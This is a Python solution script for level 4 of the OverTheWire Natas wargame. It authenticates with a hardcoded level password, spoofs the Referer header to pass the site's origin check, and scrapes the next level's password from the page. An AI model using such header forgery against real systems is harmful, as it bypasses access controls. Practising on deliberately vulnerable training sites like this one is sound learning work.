import requests
import bs4
import re


# configuration for natas4
USERNAME = 'natas4'
PASSWORD = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
URL = 'http://natas4.natas.labs.overthewire.org'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


response = requests.get(url=URL, auth=AUTH)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# we need to change the referer in the header request
# as the site only accepts authorised users from
# http://natas5.natas.labs.overthewire.org/
response = requests.get(url=URL, auth=AUTH, headers={'referer' : 'http://natas5.natas.labs.overthewire.org/'})
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


password = re.search(r'is (\w+)\n', str(div_content)).group(1)
print(f'natas5 password: {password}')